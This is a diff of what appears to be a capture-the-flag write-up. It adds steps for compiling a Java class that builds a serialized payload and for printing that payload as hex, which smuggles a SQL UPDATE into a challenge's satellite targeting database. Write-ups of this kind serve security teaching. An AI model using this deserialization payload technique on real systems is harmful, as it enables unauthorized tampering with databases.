@@ -146,7 +146,7 @@ public class SatelliteQueryFileFolderUtility implements Serializable {
     }
 }
 ```
-#### Attack Methodology
+### Attack Methodology
 - Create a query to update the table ```pointing_mode``` : ```UPDATE pointing_mode SET numerical_mode = 1 WHERE id = 1```
 - Create a serialized object of the same class we found above and dump the serialized data in HEX format
 - Insert the serialized data in the ```missile_targeting_system``` table
@@ -169,4 +169,17 @@ public class SatSerial{
         }
     }
 }
+```
+
+#### Compile and Generate the Serialized Payload
+```
+javac -classpath ".:/home/kali/Desktop/hh/gson-2.10.1.jar" SatSerial.java
+java SatSerial
+```
+
+#### Generate the Hex Serialized Payload
+```
+└─$ xxd -p -c 1000000 serializedUtility.ser                                  
+
+aced00057372001f536174656c6c697465517565727946696c65466f6c6465725574696c69747912d4f68d0eb392cb0200035a0007697351756572795a000869735570646174654c000f706174684f7253746174656d656e747400124c6a6176612f6c616e672f537472696e673b7870010174003855504441544520706f696e74696e675f6d6f646520534554206e756d65726963616c5f6d6f6465203d2031205748455245206964203d2031
 ```
